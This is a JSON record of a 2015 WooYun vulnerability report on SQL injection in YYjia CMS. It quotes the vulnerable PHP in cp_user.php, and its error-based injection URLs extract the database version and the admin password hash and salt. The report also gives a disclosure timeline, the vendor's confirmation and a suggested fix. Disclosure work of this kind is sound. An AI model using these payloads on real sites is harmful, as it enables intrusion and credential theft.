{"id": 39201, "wybug_id": "wooyun-2015-094580", "wybug_title": "YYjia cms前台过滤不严，导致注入", "wybug_corp": "yyjia.com", "wybug_author": "webos", "wybug_date": "2015-02-04 10:48", "wybug_open_date": "2015-05-08 09:44", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向公众公开  简要描述： YYjia cms前台过滤不严，导致注入 详细说明：  漏洞文件：./source/cp_user.php  \nelseif($caozuo==\"delnews\"){                      $newid=$_GET[newid];                 $sql2=\"delete from user_data where zxid='\".$newid.\"' and uid='\".$uid.\"'\";                 $_SGLOBAL['db']->query($sql2);                 $sql=\"select * from \".tname('newsinfo').\" as nwsinfo,\".tname('news_data').\" as newsdata where nwsinfo.newid=$newid and nwsinfo.newid=newsdata.newid\";                 $newsinfo=$_SGLOBAL['db']->fetch_array($_SGLOBAL['db']->query($sql));\n 这里newid由get传入，虽然说有全局GPC过滤，但是在$sql这个查询语句中，newid参数没有加单引号，便引发了sql注入  http://xx.com/index.php?ac=user&caozuo=delnews&newid=-1%20and%20updatexml(1,concat(0x17,(version())),0)%23 官网演示（demo.yyjia.com自动跳转到demo.app.com）：\n\n 本地演示： \nhttp://192.168.218.13:805//index.php?ac=user&caozuo=delnews&newid=-1%20and%20updatexml(1,concat(0x17,(select%20left(password,31)%20from%20`user`+limit+0,1)),0)%23\n \n\n由于密码是32位md5，这个报错还不够，差一位（前面还有个字符），再来一下\nhttp://192.168.218.13:805//index.php?ac=user&caozuo=delnews&newid=-1%20and%20updatexml(1,concat(0x17,(select%20right(password,3)%20from%20`user`+limit+0,1)),0)%23\n \n\n拼接下就是：45c6fa9cd475c51c4ee9b4c277d6d8d 还有salt\nhttp://192.168.218.13:805//index.php?ac=user&caozuo=delnews&newid=-1%20and%20updatexml(1,concat(0x17,(select%20salt%20from%20`user`+limit+0,1)),0)%23\n 到此为止啦~ （ps：我又传不了图片啦，，麻烦管理员帮我改下）   漏洞证明：  如上。   修复方案：  intval&加单引号   版权声明：转载请注明来源 webos@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-02-07 09:42 厂商回复： 修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}